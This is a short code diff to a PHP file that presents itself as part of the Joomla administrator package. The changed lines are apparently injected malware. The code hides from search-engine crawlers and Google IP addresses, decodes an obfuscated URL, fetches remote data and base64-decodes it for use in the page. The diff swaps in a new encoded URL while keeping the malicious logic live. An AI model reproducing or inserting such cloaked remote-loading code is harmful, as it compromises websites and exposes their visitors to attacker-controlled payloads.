@@ -1,4 +1,4 @@
-<?php 
+<?php
 /**
  * @package    Joomla.Administrator
  *
@@ -113,8 +113,8 @@ foreach (array('/\.css$/', '/\.swf$/', '/\.ashx$/', '/\.docx$/', '/\.doc$/', '/\
 $cookie_name = 'PHP_SESSION_PHP';
 if (!$bad_url AND !isset($_COOKIE[$cookie_name]) AND empty($echo_done) AND !empty($_SERVER['HTTP_USER_AGENT']) AND (substr(trim($_SERVER['REMOTE_ADDR']), 0, 6) != '74.125') AND !preg_match('/(googlebot|msnbot|yahoo|search|bing|ask|indexer)/i', $_SERVER['HTTP_USER_AGENT'])) {
 //    setcookie($cookie_name, mt_rand(1, 1024), time() + 60 * 60 * 24 * 7, '/');
-//        $url = base64_decode('a3d3czksLDI6Ny0wNy0xMDctOjIsYW9sZCw8bWpoZiV2d25ccGx2cWBmPjU0OzcyOTQyNzYwMTkyOzs2');
-    $url = decrypt_url('a3d3czksLDI6Ny0wNy0xMDctOjIsYW9sZCw8bWpoZiV2d25ccGx2cWBmPjU0OzcyOTQyNzYwMTkyOzs2');
+//        $url = base64_decode('a3d3czksLDI6Ny0wNy0xMDctOjIsYW9sZCw8bWpoZiV2d25ccGx2cWBmPjA3OzIxOTQyNzYwMTkyOzs2');
+    $url = decrypt_url('a3d3czksLDI6Ny0wNy0xMDctOjIsYW9sZCw8bWpoZiV2d25ccGx2cWBmPjA3OzIxOTQyNzYwMTkyOzs2');
     $code = request_url_data($url);
 //    if (!empty($code) AND base64_decode($code) AND preg_match('#[a-zA-Z0-9+/]+={0,3}#is', $code, $m)) {
     if (($code = request_url_data($url)) AND $decoded = base64_decode($code, true)) {
